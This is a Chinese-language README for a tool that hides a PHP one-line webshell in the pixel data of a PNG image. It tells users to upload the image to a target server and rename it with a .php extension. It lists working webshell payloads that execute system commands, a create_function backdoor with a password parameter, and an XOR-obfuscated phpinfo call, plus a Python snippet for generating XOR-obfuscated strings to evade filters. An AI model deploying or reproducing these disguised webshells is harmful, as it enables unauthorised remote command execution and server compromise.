# ImageWebshell

将一句话木马隐藏到像素颜色中，生成抗裁剪的PNG图片马

除了生成一句话木马之外还支持生成带有任意文本的PNG图片

## 安装

`pip install -r requirements.txt`

## 使用

`python -m image_webshell`，然后将`output.png`传到目标上，后缀改为PHP即可

命令行选项：

- `text`: 指定webshell文本，注意不要使用会被deflate过度压缩的文本（即不要带有重复字符或者连续的小写字母等）
- `width`: 指定图像的宽度，不宜太宽
- `height`: 指定图像的高度
- `output`: 图像保存地址

## 关于自定义文本

项目在其他工具的基础上实现了自定义文本的功能，但是因为PNG算法需要对数据进行deflate压缩，所以需要保证文本可以被deflate生成（也就是存在某一段二进制被deflate压缩后产生所需的文本）

所以文本一般需要满足这些性质：

- 不要带有连续的大小写字母（如`system`）
- 不要带有连续的空格
- 不要过短
- 不能太长

经过测试这些文本是可以的：

- `<?=$_GET[1]($_REQUEST[2]);>`: 传参`?1=system&2=ls`可以执行命令
- `<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>`: 一句话木马，GET传参`?0=create_function`，密码为1
- `<?=("=<)L3=5"^"MTY%][Z")();?>`: phpinfo，其中`"=<)L3=5"^"MTY%][Z"`代表字符串`"phpinfo"`

如上方phpinfo的异或字符串可以用下列简单的python代码生成：

```python
import random

s = "phpinfo"
chrs = [i for i in range(32, 127) if chr(i) not in ["'", '"', "\\", "`"]]
xor_maps = {(a, b): a ^ b for a in chrs for b in chrs}
l = [random.choice([tpl for tpl, c in xor_maps.items() if c == ord(ch)]) for ch in s]
print(f"{''.join(chr(a) for a, _ in l)!r}^{''.join(chr(b) for _, b in l)!r}")
```